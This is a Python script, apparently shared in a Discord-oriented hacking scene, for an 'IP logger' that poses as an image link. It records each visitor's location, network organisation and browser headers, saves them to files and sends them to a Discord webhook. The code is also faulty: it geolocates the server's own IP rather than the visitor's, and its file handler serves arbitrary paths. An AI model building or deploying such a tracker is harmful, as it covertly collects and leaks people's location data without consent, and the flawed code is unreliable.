# Made by ! zeroo#2801, skid and i send nukes 👍

import http.server
import socketserver
import os
import requests
import geocoder
import json

with open("stuff/setting.json", "r") as f:
  data = json.load(f)

webhook = data["webhook"]
logging = data["enable_logging"]
toggle_web = data["webhook_toggle"]
image = "stuff/image.jpg"
toggle_log = data["save_txt"]

blacklisted_agents = ["Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"]

class IPHandler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        filename = self.path[1:]
        if os.path.isfile(filename):
            self.send_response(200)
            self.send_header('Content-type', 'image/jpg')
            self.end_headers()
            with open(filename, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'File not found')

    if logging:
     def do_GET(self):
        try:
            ip = requests.get('https://api.ipify.org').text

            g = geocoder.ip(ip)
            lat, lng = g.latlng
            position = f'**Latitude:** {lat}\n**Longitude:** {lng}'
        
            resp = requests.get('http://ipinfo.io/json')
            data = json.loads(resp.text)
            city = data['city']
            region = data['region']
            country = data['country']
            org = data['org']      

            headers = self.headers
            user_agent = headers.get('User-Agent')
            host = headers.get('Host')
            encoding = headers.get('Accept-Encoding')
            is_proxy = headers.get('Via') or headers.get('X-Forwarded-For')
            is_vpn = False
            
            if toggle_log:
                with open(f'logs/{ip}.txt', 'w') as f:
                    f.write(f"IP address: {ip}\n")
                    f.write(f"Location: {city}, {region}, {country}\n")
                    f.write(f"Coordinates: {position}\n")
                    f.write(f"Organization: {org}\n")
                    f.write(f"User Agent: {user_agent}\n")
                    f.write(f"Host: {host}\n")
                    f.write(f"Accept Encoding: {encoding}\n")
                    f.write(f"Is Proxy: {is_proxy}\n")
                    f.write(f"Is VPN: {is_vpn}\n")

            if is_proxy or is_vpn:
                message = f"There's presence of a VPN or Proxy server.\n**User-Agent:** {user_agent}\n**Accept-Encoding:** {encoding}"
                color = 0x000000
            elif user_agent in blacklisted_agents:
                message = f"Your user agent has been blacklisted."
                color = 0x000000
            else:
                message = f"**User-Agent:** {user_agent}\n**Host:** {host}\n**Accept-Encoding:** {encoding}\n{position}"
                color = 0xffffff

            url = f"https://whatismyipaddress.com/ip/{ip}"            

            embed = {
                "title": "**+leaks ip logger**",
                "color": color,
                "fields": [
                    {
                        "name": "IP Address",
                        "value": ip
                    },
                    {
                        "name": "Location",
                        "value": f"{city}, {region}, {country}\n{org}"
                    },
                    {
                        "name": "More info",
                        "value": message
                    }
                ],
                "footer": {
                    "text": "More info: " + url
                },
                "thumbnail": {
                    "url": "https://media.discordapp.net/attachments/1098269219977695387/1100381884220977162/static.png"
                }
            }
            payload = {
                "embeds": [embed]
            }
            
            if toggle_web:
                requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
            
        except Exception as e:
            print(f"Error: {e}")
        
        self._set_headers()

PORT = 8000

with socketserver.TCPServer(('', PORT), IPHandler) as httpd:
    print(f'Server started on port {PORT}')
    httpd.serve_forever()
